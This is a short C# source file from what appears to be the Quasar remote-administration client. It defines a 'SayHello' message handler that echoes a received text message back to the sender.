using Quasar.Client.Helper;
using Quasar.Client.IpGeoLocation;
using Quasar.Client.User;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;
using Quasar.Client.IO;

namespace Quasar.Client.Messages
{
    public class SayHelloHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetSayHello;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetSayHello msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetSayHello message)
        {
            try
            {
                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                {
                    new Tuple<string, string>("client received message", message.msg),
                };
                client.Send(new GetSayHelloResponse { msgs = lstInfos });
            }
            catch
            {
            }
        }
    }
}
